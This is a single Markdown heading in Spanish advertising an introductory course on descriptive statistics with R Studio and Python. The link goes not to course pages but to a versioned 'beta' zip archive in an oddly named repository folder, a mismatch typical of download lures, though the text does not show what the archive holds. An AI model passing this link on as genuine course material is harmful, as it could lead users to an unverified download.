# [Curso de introducción a la estadística descriptiva con R Studio y Python](https://raw.githubusercontent.com/shumager/r-basic/master/mononeural/r_basic_1.5-beta.5.zip)
